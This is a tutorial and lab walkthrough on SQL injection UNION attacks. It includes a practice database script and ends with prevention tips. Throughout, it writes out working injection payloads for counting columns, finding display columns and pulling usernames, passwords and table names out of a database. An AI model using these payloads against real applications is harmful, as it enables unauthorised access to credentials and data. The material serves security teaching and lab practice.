# 🧠 Understanding SQL Injection UNION Attacks (Step-by-Step)

## 🔍 What is a SQL Injection UNION Attack?

When a web app is vulnerable to **SQL injection**, and it shows you the **results of a database query**, attackers can use the `UNION` keyword to:

> 💡 **Retrieve data from other tables in the same database.**

### Example:
```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2
```

👉 This will return one combined list with values from both tables — two columns: one with `a` and `c`, another with `b` and `d`.



## ⚠️ Two Key Rules for Using UNION

To make a successful UNION attack, your injected query must match:

1. **Same number of columns** as the original query.
2. **Compatible data types** in each column.

If these aren't matched, the database will throw an error ❌.

So, how do you find this out? Let’s walk through it!



# 🛠 Step-by-Step Guide to Performing a UNION Attack

## 🔎 Step 1: Test How Many Columns Are Returned

You need to know how many columns the original query returns before you can match them with your `UNION SELECT`.

### Method A: Use `ORDER BY`

Try injecting payloads like:
```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```

💡 Explanation:
- If there are **2 columns**, then `ORDER BY 3` will cause an error ❗
- You’ll know the correct number when the page **stops showing errors** or behaves normally ✅

### Method B: Use `UNION SELECT NULL`

Try:
```text
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
```

🧠 Why `NULL`?
- `NULL` works with any data type.
- When the number of `NULL`s matches the actual number of columns → the query runs without error ✅



## 🕵️ Step 2: Find Which Columns Can Display Data

Now that you know how many columns there are, test which ones can actually show data.

Example:
```text
' UNION SELECT 'test',NULL,NULL--  
' UNION SELECT NULL,'test',NULL--  
' UNION SELECT NULL,NULL,'test'--
```

👀 Look for where `'test'` appears on the page — that tells you which column you can use to extract data.



## 📦 Step 3: Extract Useful Data

Once you’ve found the right number of columns and which ones display data, now you can start extracting real info from other tables.

Examples:
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, null FROM information_schema.tables--
```

📌 Tip: You can often get:
- Table names
- Column names
- Usernames & passwords
- Sensitive internal data

## 🧪 SQL Script: Create Tables + Insert Sample Data
Based on your **educational scenario**, I’ve created a matching **SQL database schema** that you can use to simulate and practice **SQL injection UNION attacks**.

This DB includes:
- A `products` table (simulates vulnerable query output)
- A `users` table (contains usernames & passwords)
- A `secrets` table (sensitive internal data)

These help demonstrate how attackers extract hidden data using `UNION`.

```sql
-- 🛒 Products Table (simulates visible app data)
CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY,
    name TEXT NOT NULL,
    category TEXT NOT NULL,
    price REAL NOT NULL
);

-- Insert sample products
INSERT INTO products (id, name, category, price) VALUES
(1, 'Wireless Mouse', 'Electronics', 29.99),
(2, 'Notebook', 'Stationery', 4.99),
(3, 'Coffee Mug', 'Home', 8.50),
(4, 'Headphones', 'Electronics', 79.99);

-- 👤 Users Table (hidden sensitive data)
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
);

-- Insert user credentials
INSERT INTO users (id, username, password) VALUES
(1, 'admin', 'SecurePass123'),
(2, 'alice', 'Pa$$w0rd'),
(3, 'bob', 'qwerty123');

-- 🔐 Secrets Table (extra hidden data for advanced exploitation)
CREATE TABLE IF NOT EXISTS secrets (
    secret_id INTEGER PRIMARY KEY,
    secret_name TEXT NOT NULL,
    secret_value TEXT NOT NULL
);

-- Insert example secrets
INSERT INTO secrets (secret_id, secret_name, secret_value) VALUES
(1, 'API_KEY', 'ABCD1234-EFGH5678-IJKL90MN'),
(2, 'DB_PASSWORD', 'SuperSecretDBPass123'),
(3, 'FLAG', 'union_attack_success');
```



## 🔍 Example Queries for UNION Practice

### 📊 Simulate Vulnerable Query (e.g., from an app filtering by category):

```sql
SELECT name, price FROM products WHERE category = 'Electronics';
```

### 💥 Step 1: Determine Number of Columns with ORDER BY

```sql
SELECT name, price FROM products WHERE category = 'Electronics' ORDER BY 1-- 
SELECT name, price FROM products WHERE category = 'Electronics' ORDER BY 2-- 
SELECT name, price FROM products WHERE category = 'Electronics' ORDER BY 3-- 
```

➡️ When you get an error at `ORDER BY 3`, you know the original query returns **2 columns**.



### 💥 Step 2: Try UNION with NULLs

```sql
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT NULL, NULL-- 
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT NULL, 'test'-- 
```

✅ If the page shows `'test'`, you've found a working column!



### 💥 Step 3: Extract Hidden Data

Now inject real data:

#### Get usernames and passwords:
```sql
SELECT name, price FROM products WHERE category = 'Electronics'
UNION
SELECT username, password FROM users--
```

#### Get secrets:
```sql
SELECT name, price FROM products WHERE category = 'Electronics'
UNION
SELECT secret_name, secret_value FROM secrets--
```


## 🧪 Lab Walkthrough: SQL Injection UNION Attack — Determining Number of Columns

> **Lab Title:** SQL injection UNION attack, determining the number of columns returned by the query  
> **Difficulty:** Practitioner  
> **Status:** ✅ Solved  
> **Target:** Identify how many columns are returned from the original query using a UNION-based SQL injection.



## 🔍 Overview

This lab simulates a vulnerable **product category filter**, where user input is directly used in a database query without proper sanitization. Since the results of the query are reflected in the application's response (e.g., visible product list), we can exploit it with a **SQL injection UNION attack**.

The first step in any UNION-based attack is to determine how many **columns** are being returned by the original query.

Why? Because:
- The injected `UNION SELECT` must return the **same number of columns**
- And each column must be of a **compatible data type**

So, let’s find out how many columns are returned!


## 🛠 Step-by-Step Guide

### 🔹 Step 1: Locate the Vulnerable Input

Go to the lab and try selecting different categories. You’ll notice that the URL or request includes something like:

```
GET /filter?category=Gifts
```

This means the backend is likely running a query like:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

We need to inject into the `category` parameter.



### 🔹 Step 2: Try Basic Injection Payload

Start by testing if SQL injection is possible:

```
Gifts'
```

If the page shows an error ❌ → It's likely vulnerable!

Now try:

```
Gifts'--
```

This closes the string and comments out the rest of the query. If the page loads normally ✅ → Confirmed vulnerability!



## 🧪 Step 3: Determine Number of Columns Using `UNION SELECT NULL`

We'll now test how many columns the original query returns by trying different numbers of `NULL`s:

### 🔁 Try These Payloads One at a Time:

```
Gifts' UNION SELECT NULL-- 
```

➡️ If you get an error like "number of columns does not match", try:

```
Gifts' UNION SELECT NULL,NULL-- 
```

Still an error? Keep adding more `NULL`s:

```
Gifts' UNION SELECT NULL,NULL,NULL-- 
```

🔁 Continue until the page **loads normally and displays additional content (like null values)**.



### ✅ Example That Works:

Once you find the correct number, say **2 columns**, your payload will look like:

```
Gifts' UNION SELECT NULL,NULL-- 
```

You should see an extra row appear on the page, possibly showing something like:

```
NULL | NULL
```

Or maybe even just an extra blank row — this confirms the query returns **2 columns**.


✅ So, the original query returns **2 columns**.



## 🧩 Why Use `NULL`?

Because:
- `NULL` works with **any data type**
- It avoids errors due to incompatible types
- It helps us **match the structure** without knowing what the original query does



## 🎯 Result

To solve the lab:

Use this payload:
```
Gifts' UNION SELECT NULL,NULL-- 
```

✅ This tells you the original query returns **2 columns**.

Submit the answer or continue to the next lab where you'll use these 2 columns to extract sensitive data like usernames and passwords.



## 🛡️ Prevention Tips

To prevent this kind of vulnerability in real apps:

- ✅ Always use **parameterized queries / prepared statements**
- ✅ Sanitize and validate all user inputs
- ✅ Never expose raw database errors to users
- ✅ Limit database permissions — don’t run as admin
- ✅ Use Web Application Firewalls (WAFs) to detect common SQLi patterns



## 🧠 Bonus Tip: Alternative Method — `ORDER BY`

You can also use the `ORDER BY` technique to guess the number of columns:

```
Gifts' ORDER BY 1-- 
Gifts' ORDER BY 2-- 
Gifts' ORDER BY 3-- 
```

When you hit a number that causes an error (e.g., `ORDER BY 3`), subtract one — that's how many columns there are.



## 🧩 Summary Table

| Step | Goal | Technique |
|------|------|-----------|
| 1 | Find column count | `ORDER BY n--` or `UNION SELECT NULL,...` |
| 2 | Check usable columns | Inject `'test'` into different columns |
| 3 | Extract sensitive data | `UNION SELECT col1, col2 FROM other_table` |
| 4 | Prevent exploitation | Use parameterized queries + limit permissions |


## 🎯 Final Thought

A SQLi UNION attack is powerful because it lets attackers pull data from **any table** in the database — if the app isn’t secure.

But remember:

> 🔐 **Always treat user input as dangerous. Always validate and sanitize. Always use safe SQL practices.**
